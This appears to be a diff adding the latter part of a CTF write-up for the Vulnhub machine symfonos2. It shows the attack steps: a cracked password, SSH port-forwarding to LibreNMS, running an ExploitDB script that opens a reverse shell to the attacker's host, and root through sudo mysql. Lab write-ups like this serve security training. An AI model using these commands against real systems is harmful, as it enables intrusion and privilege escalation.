@@ -191,3 +191,161 @@ Now back to `proFTPD` RCE.
 
 But seems it a deadend we have no write access, permission on `/var/wwww/html` now back to the shadow file that we are cracking.
 
+```
+┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
+└─$ john --show shadow.bak
+aeolus:sergioteamo:18095:0:99999:7:::
+
+1 password hash cracked, 2 left
+```
+
+Only one of the user hash was cracked which is `aeolus` time to SSH into the target XD.
+
+![image](https://user-images.githubusercontent.com/69868171/157872695-df0e24c4-a76f-4f0b-80f2-bd50c0b2c997.png)
+
+We are in now more enumeration. Checkig `SUID` and `Sudo` .
+
+```
+aeolus@symfonos2:~$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/sbin/exim4
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/bin/mount
+/bin/su
+/bin/ping
+/bin/umount
+```
+
+![image](https://user-images.githubusercontent.com/69868171/157875914-75d9830a-c0d5-428c-b29a-d3f5749e641b.png)
+
+But seems user `aeolus` can't run `sudo` it time to keep moving forward let check if we have any local port running on the target.
+
+```
+aeolus@symfonos2:~$ ss -tulpn
+Netid State      Recv-Q Send-Q                                    Local Address:Port                                                   Peer Address:Port              
+udp   UNCONN     0      0                                                     *:68                                                                *:*                  
+udp   UNCONN     0      0                                                     *:68                                                                *:*                  
+udp   UNCONN     0      0                                        172.16.109.255:137                                                               *:*                  
+udp   UNCONN     0      0                                        172.16.109.163:137                                                               *:*                  
+udp   UNCONN     0      0                                                     *:137                                                               *:*                  
+udp   UNCONN     0      0                                        172.16.109.255:138                                                               *:*                  
+udp   UNCONN     0      0                                        172.16.109.163:138                                                               *:*                  
+udp   UNCONN     0      0                                                     *:138                                                               *:*                  
+udp   UNCONN     0      0                                                     *:161                                                               *:*                  
+tcp   LISTEN     0      80                                            127.0.0.1:3306                                                              *:*                  
+tcp   LISTEN     0      50                                                    *:139                                                               *:*                  
+tcp   LISTEN     0      128                                           127.0.0.1:8080                                                              *:*                  
+tcp   LISTEN     0      32                                                    *:21                                                                *:*                  
+tcp   LISTEN     0      128                                                   *:22                                                                *:*                  
+tcp   LISTEN     0      20                                            127.0.0.1:25                                                                *:*                  
+tcp   LISTEN     0      50                                                    *:445                                                               *:*                  
+tcp   LISTEN     0      50                                                   :::139                                                              :::*                  
+tcp   LISTEN     0      64                                                   :::80                                                               :::*                  
+tcp   LISTEN     0      128                                                  :::22                                                               :::*                  
+tcp   LISTEN     0      20                                                  ::1:25                                                               :::*                  
+tcp   LISTEN     0      50                                                   :::445                                                              :::*                  
+aeolus@symfonos2:~$ 
+```
+
+Nice guess seems we have a port running locally which is `8080` let quickly port forward to be able to access it at our end.
+
+```
+┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
+└─$ ssh -L 8080:127.0.0.1:8080 aeolus@172.16.109.163
+aeolus@172.16.109.163's password: 
+Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Fri Mar 11 04:21:32 2022 from 172.16.109.1
+aeolus@symfonos2:~$ 
+```
+
+![image](https://user-images.githubusercontent.com/69868171/157877092-9a500700-f4e6-4f28-8e85-0f711f5f4ecd.png)
+
+Now we are talking `LibreNMS` should be cool to exploit but we need to get in first let try some default credentials and password reused.
+
+![image](https://user-images.githubusercontent.com/69868171/157877308-f0c38a55-93c6-4064-8d3a-c584520eea48.png)
+
+But no way a slap back now let try the credentials we have on it.
+
+```
+aeolus:sergioteamo
+```
+
+![image](https://user-images.githubusercontent.com/69868171/157877489-a365f1bd-c968-49e1-8983-23a4b9bbfb3c.png)
+
+Mama we are in XD now let look around what version is it running is it and is it vulnerable let do some research.
+
+![image](https://user-images.githubusercontent.com/69868171/157878266-7fa2789c-36dc-41cf-b7d1-6d37695e7b7d.png)
+
+Downloaded and ready to run.
+
+```
+┌──(muzec㉿Muzec-Security)-[~/Documents/Vulnhubs/symfonos2]
+└─$ python 47044.py http://127.0.0.1:8080/ "librenms_session=eyJpdiI6IkwwZFI4bktlSGU1d01JVTlIbGE3Tnc9PSIsInZhbHVlIjoiOHV0QWxUZVlTVm0zU2JSZEVFXC94SDYxXC9wcnpDSHVmUllKUWhNUkFjT1ZLZG5VeFcrbE5iNlR5bG9VaUFwUmNGM0VVb0tJQm9PQ2FoT2gySGxPUEh4QT09IiwibWFjIjoiODJlMTZkOGE2ZDc0ZTNiYjBkOTVlZWQwZjBhNjBiNzdkYTY5ZmEzYzI0N2Q0NDk4NDkzNzVhNTQ4OTFkMWQxOSJ9;PHPSESSID=n7m2rbfrv8fnl4209q1auu3fa3;XSRF-TOKEN=eyJpdiI6InFVUVVnc1VGaGVqTXM1R1plXC9HUWNRPT0iLCJ2YWx1ZSI6IjR5T0JWcytlWFwvcEZXdkFyOXRQKzVzNUp6Vjh1QjJWQWg0ajdGWVYxUDY1RDgzY044ZEhYVW1CTnNkaFhWanZOeEpHUUxYdU5vYjE5eWowZkFCSW14QT09IiwibWFjIjoiMDFjOGQ2MzZjM2Q2NjM3MDUxMmM2M2FlNDVhODJmMGIyMGQzMjgyYzkxYzkzMzAwMzg2ZDkwZWVhOWE0MWU5OCJ9" 172.16.109.1 1337
+```
+
+![image](https://user-images.githubusercontent.com/69868171/157879405-08409578-00fa-492d-bd3c-46761b84e169.png)
+
+Boom we have shell let spawn a full tty shell to make it more stable to use.
+
+![image](https://user-images.githubusercontent.com/69868171/157879776-0f049d10-a2d0-4b25-a44a-cf4598ae867e.png)
+
+More better now checking `sudo` and boom seems we can run `mysql` .
+
+![image](https://user-images.githubusercontent.com/69868171/157879883-7e8cc76e-1203-40cf-9b14-dc44b7901764.png)
+
+```
+sudo /usr/bin/mysql
+```
+
+![image](https://user-images.githubusercontent.com/69868171/157881282-78c8ac26-da97-4345-b8ab-42802254fcad.png)
+
+```
+system id
+```
+
+We can see that we are `root` now let drop into it.
+
+```
+system bash
+```
+
+![image](https://user-images.githubusercontent.com/69868171/157881454-7628a9b3-2c3c-42fa-9bf2-574927e3976c.png)
+
+We are rooooooooooooooooooot now let get the `proof.txt` .
+
+```
+cat proof.txt;hostname;id;whoami;ip addr
+```
+
+![image](https://user-images.githubusercontent.com/69868171/157881851-cc389fc6-6c82-4d8d-883e-b27759d67ea9.png)
+
+### Little Extra Spicy XD
+
+Back to our brute forcing we background when working on the target.
+
+
+![image](https://user-images.githubusercontent.com/69868171/157882060-cf29458c-ef7e-43d1-aade-1176366276fe.png)
+
+I was able to get the password for `aeolus` by brute forcing both `FTP, SSH` probably it going to take some time 30-40min .
+
+We are done.
+
+Greeting From [Muzec](https://twitter.com/muzec_saminu)
+
+<br> <br>
+[Back To Home](../index.md)
+<br>
